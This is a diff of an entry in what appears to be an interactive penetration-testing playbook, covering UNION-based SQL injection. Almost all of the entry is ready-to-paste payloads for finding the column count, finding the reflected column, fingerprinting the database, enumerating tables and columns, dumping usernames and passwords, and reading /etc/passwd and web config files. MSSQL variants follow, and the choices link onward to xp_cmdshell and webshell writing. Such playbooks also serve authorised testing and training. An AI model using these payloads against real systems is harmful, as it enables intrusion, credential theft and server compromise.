@@ -3387,43 +3387,70 @@ curl -s -i -X POST "http://TARGET/login" --data "user=admin'&pass=x" | grep -iE 
   sqli_union: {
     phase: "WEB",
     title: "SQLi — UNION-Based Extraction",
-    body: "Append your SELECT to the original query. PortSwigger: requires matching column count and compatible types. Most reliable extraction when columns are visible in response. Suppress original rows with AND 1=0.",
-    cmd: `# Prerequisites: column count known, string column found
-# Assume 3 columns, column 2 is string:
+    body: "UNION injection appends your SELECT to the original query and returns data in the response. Two prerequisites: you must match the exact column count of the original query, and at least one column must accept a string. The A1/B2/C3 canary technique finds the reflected column fast — inject unique string markers and see which one appears in the page. Once you know which column reflects, every piece of data flows through it via subqueries.",
+    cmd: `# ── STEP 1: FIND COLUMN COUNT (ORDER BY) ──
+# Increment until you get an error — last working number = column count
+' ORDER BY 1--+-
+' ORDER BY 2--+-
+' ORDER BY 5--+-    # error here → 4 columns
+' ORDER BY 4--+-    # works → confirmed 4 columns
+# In POST body (URL-encoded):
+# username='order+by+5--+-&password=attempt
 
-# ── DATABASE FINGERPRINT ─────────────────
-' UNION SELECT NULL,version(),NULL--
-' UNION SELECT NULL,database(),NULL--
-' UNION SELECT NULL,user(),NULL--
+# ── STEP 2: FIND REFLECTED COLUMN (CANARY) ─
+# Inject unique string markers in every position
+# Look at the page — whichever value appears is your extraction column
+' UNION SELECT 'A1','B2','C3','D4','E5'--+-
+# See 'B2' in response → column 2 is your string column
 
-# ── ENUMERATE STRUCTURE ──────────────────
-# All databases
-' UNION SELECT NULL,group_concat(schema_name),NULL FROM information_schema.schemata--
+# POST body example (5 columns, column 2 reflects):
+# username='+UNION+select+'A1','B2','C3','D4','E5'--+-&password=attempt
 
-# Tables in current DB
-' UNION SELECT NULL,group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
+# ── STEP 3: DATABASE FINGERPRINT ──────────
+' UNION SELECT 'A1',database(),'C3','D4','E5'--+-
+' UNION SELECT 'A1',version(),'C3','D4','E5'--+-
+' UNION SELECT 'A1',user(),'C3','D4','E5'--+-
 
-# Columns in users table
-' UNION SELECT NULL,group_concat(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
+# ── STEP 4: ENUMERATE TABLES ──────────────
+# Method 1 — subquery into column 2:
+' UNION SELECT 'A1',(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),'C3','D4','E5'--+-
 
-# ── DUMP CREDENTIALS ─────────────────────
-' UNION SELECT NULL,group_concat(username,0x3a,password SEPARATOR 0x0a),NULL FROM users--
+# Method 2 — direct (cleaner when original query returns no rows):
+' UNION SELECT 'A1',table_name,'C3','D4','E5' FROM information_schema.tables WHERE table_schema=database()--+-
 
-# If original query returns rows (swallows yours):
-' AND 1=0 UNION SELECT NULL,group_concat(username,0x3a,password),NULL FROM users--
+# ── STEP 5: ENUMERATE COLUMNS ─────────────
+# All columns in a specific table:
+' UNION SELECT 'A1',(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),'C3','D4','E5'--+-
 
-# ── FILE READ ────────────────────────────
-' UNION SELECT NULL,load_file('/etc/passwd'),NULL--
-' UNION SELECT NULL,load_file('/var/www/html/config.php'),NULL--
-' UNION SELECT NULL,load_file('/etc/apache2/sites-enabled/000-default.conf'),NULL--
+# All columns scoped to current DB (avoids cross-DB noise):
+' UNION SELECT 'A1',(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database()),'C3','D4','E5'--+-
 
-# ── MSSQL UNION ──────────────────────────
+# Direct method:
+' UNION SELECT 'A1',column_name,'C3','D4','E5' FROM information_schema.columns WHERE table_name='users'--+-
+
+# ── STEP 6: DUMP CREDENTIALS ──────────────
+# group_concat with @@ separator — all rows in one response
+' UNION SELECT 'A1',group_concat(name,'@@',username,'@@',password),'C3','D4','E5' FROM users--+-
+
+# Colon separator (classic):
+' UNION SELECT 'A1',group_concat(username,0x3a,password SEPARATOR 0x0a),'C3','D4','E5' FROM users--+-
+
+# If original query returns rows and drowns yours:
+' AND 1=0 UNION SELECT 'A1',group_concat(username,0x3a,password),'C3','D4','E5' FROM users--+-
+
+# ── STEP 7: FILE READ ─────────────────────
+# Requires FILE privilege on DB user
+' UNION SELECT 'A1',load_file('/etc/passwd'),'C3','D4','E5'--+-
+' UNION SELECT 'A1',load_file('/var/www/html/config.php'),'C3','D4','E5'--+-
+' UNION SELECT 'A1',load_file('/etc/apache2/sites-enabled/000-default.conf'),'C3','D4','E5'--+-
+
+# ── MSSQL VARIANT ─────────────────────────
 ' UNION SELECT NULL,@@version,NULL--
 ' UNION SELECT NULL,name,NULL FROM master..sysdatabases--
 ' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--`,
-    warn: "If UNION returns nothing but no error: the original query returns multiple rows, drowning yours. Add AND 1=0 to kill the original results. If still nothing: column types don't match — try casting: cast(version() as varchar).",
+    warn: "If UNION returns nothing but no error: the original query returns multiple rows drowning yours — add AND 1=0 before UNION to suppress original results. If column type mismatch error: replace string markers with NULL for non-string columns (e.g. 'A1',NULL,NULL) or cast: CAST(version() AS CHAR). The @@ separator in group_concat is more readable than 0x3a (:) when dumping multiple fields — use something that won't appear in the data.",
     choices: [
-      { label: "Dumped credentials", next: "creds_found" },
+      { label: "Dumped credentials — crack or reuse", next: "creds_found" },
       { label: "FILE read working — hunting configs", next: "sqli_shell" },
       { label: "MSSQL — escalate to xp_cmdshell", next: "mssql" },
       { label: "Write webshell via INTO OUTFILE", next: "sqli_shell" },
